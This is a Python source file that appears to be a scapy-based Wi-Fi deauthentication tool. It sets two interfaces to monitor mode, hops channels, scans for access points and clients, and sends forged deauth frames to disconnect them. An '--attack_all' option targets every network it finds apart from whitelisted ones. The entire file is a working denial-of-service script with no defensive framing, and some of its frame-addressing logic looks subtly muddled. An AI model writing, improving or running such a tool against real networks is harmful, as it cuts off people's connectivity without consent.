import argparse
import subprocess
import time
import logging
from scapy.all import sniff, sendp #, RadioTap, Dot11, Dot11Deauth
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11Elt

# Constants
INTERFACE_MONITOR_1 = "wlan1"
INTERFACE_MONITOR_2 = "wlan2"

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Initialize arguments
parser = argparse.ArgumentParser(description="Deauth unwanted users from Wi-Fi network.")
parser.add_argument("--death_reasons", nargs='+', type=int, default=[1], help="List of deauth codes to be sent sequentially to the target.")
parser.add_argument("--death_seq", type=int, default=1, help="Number of packets for each reason to be sent at once.")
parser.add_argument("--whitelist_ap", nargs='+', default=[], help="Ignore these ESSID or BSSID APs from attacking.")
parser.add_argument("--whitelist_client", nargs='+', default=[], help="Ignore these clients from attacking.")
parser.add_argument("--blacklist_ap", nargs='+', default=[], help="List of ESSID or BSSID AP targets.")
parser.add_argument("--blacklist_client", nargs='+', default=[], help="List of client targets.")
parser.add_argument("--attack_all", action='store_true', help="Allows to use empty blacklist lists and attacks all found, except for whitelist.")
parser.add_argument("--channel_list", nargs='+', type=int, required=True, help="Channels to hop.")
parser.add_argument("--channel_wait", type=int, default=1, help="For how long to stay on a selected channel before hopping.")
args = parser.parse_args()

def set_monitor_mode(interface):
    """Sets the specified wireless interface to monitor mode."""
    try:
        logging.info(f"Setting {interface} to monitor mode")
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to set monitor mode on {interface}: {e}")

def set_channel(interface, channel):
    """Sets the specified wireless interface to the given channel."""
    try:
        logging.info(f"Setting {interface} to channel {channel}")
        subprocess.run(["iwconfig", interface, "channel", str(channel)], check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to set channel {channel} on {interface}: {e}")

def scan_networks(interface):
    """
    Scans for networks and connected clients on the specified interface.
    Returns a list of APs and clients.
    """
    ap_list = []
    client_list = []

    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            bssid = pkt.addr2.lower() if pkt.addr2 else ''
            if pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
                ssid = pkt.info.decode() if pkt.haslayer(Dot11Elt) else ''
                if (ssid, bssid) not in ap_list:
                    ap_list.append((ssid, bssid))
            elif pkt.type == 2 and pkt.addr3 == bssid:  # Data frames
                client = pkt.addr1.lower() if pkt.addr1 and ':' in pkt.addr1 else pkt.addr2.lower()
                if client not in client_list:
                    client_list.append(client)

    try:
        logging.info(f"Scanning networks on {interface}")
        sniff(iface=interface, prn=packet_handler, timeout=10, store=0)
    except Exception as e:
        logging.error(f"Error while scanning networks: {e}")
    return ap_list, client_list

def create_deauth_packet(src, dst, bssid, reason):
    """
    Creates a deauthentication packet.
    Returns the created packet.
    """
    dot11 = Dot11(addr1=dst, addr2=src, addr3=bssid)
    return RadioTap() / dot11 / Dot11Deauth(reason=reason)

def send_deauth_packets(interface, target, bssid, reasons, seq):
    """
    Sends deauthentication packets to the target.
    """
    try:
        for reason in reasons:
            packet = create_deauth_packet(src=target, dst=bssid, bssid=bssid, reason=reason)
            sendp(packet, iface=interface, count=seq, inter=0.1, verbose=0)
            logging.info(f"Sent deauth packets to {target} from BSSID {bssid} with reason {reason}")
    except Exception as e:
        logging.error(f"Error while sending deauth packets: {e}")

def deauth_process():
    """
    Main process for performing deauthentication attacks.
    """
    while True:
        for channel in args.channel_list:
            logging.info(f"Switching to channel {channel}")
            set_channel(INTERFACE_MONITOR_1, channel)
            set_channel(INTERFACE_MONITOR_2, channel)

            ap_list, client_list = scan_networks(INTERFACE_MONITOR_1)
            logging.info(f"Found {len(ap_list)} APs and {len(client_list)} clients on channel {channel}")

            for ssid, bssid in ap_list:
                if (bssid in args.whitelist_ap) or (ssid in args.whitelist_ap):
                    continue
                if args.attack_all or (bssid.lower() in args.blacklist_ap or ssid in args.blacklist_ap):
                    for client in client_list:
                        if client in args.whitelist_client:
                            continue
                        if args.attack_all or client in args.blacklist_client:
                            logging.info(f"Deauthing client {client} from BSSID {bssid} (SSID: {ssid})")
                            send_deauth_packets(INTERFACE_MONITOR_2, target=client, bssid=bssid, reasons=args.death_reasons, seq=args.death_seq)

            logging.info(f"Waiting {args.channel_wait} seconds before channel hop")
            time.sleep(args.channel_wait)

def main():
    """
    Entry point for the script. Sets up interfaces and starts the deauth process.
    """
    try:
        logging.info("Setting interfaces to monitor mode")
        set_monitor_mode(INTERFACE_MONITOR_1)
        set_monitor_mode(INTERFACE_MONITOR_2)
        deauth_process()
    except KeyboardInterrupt:
        logging.info("\nInterrupted by user, shutting down...")
    finally:
        logging.info("Restoring network interfaces...")
        try:
            subprocess.run(["ifconfig", INTERFACE_MONITOR_1, "down"], check=True)
            subprocess.run(["iwconfig", INTERFACE_MONITOR_1, "mode", "managed"], check=True)
            subprocess.run(["ifconfig", INTERFACE_MONITOR_1, "up"], check=True)
            subprocess.run(["ifconfig", INTERFACE_MONITOR_2, "down"], check=True)
            subprocess.run(["iwconfig", INTERFACE_MONITOR_2, "mode", "managed"], check=True)
            subprocess.run(["ifconfig", INTERFACE_MONITOR_2, "up"], check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to restore network interfaces: {e}")

if __name__ == "__main__":
    main()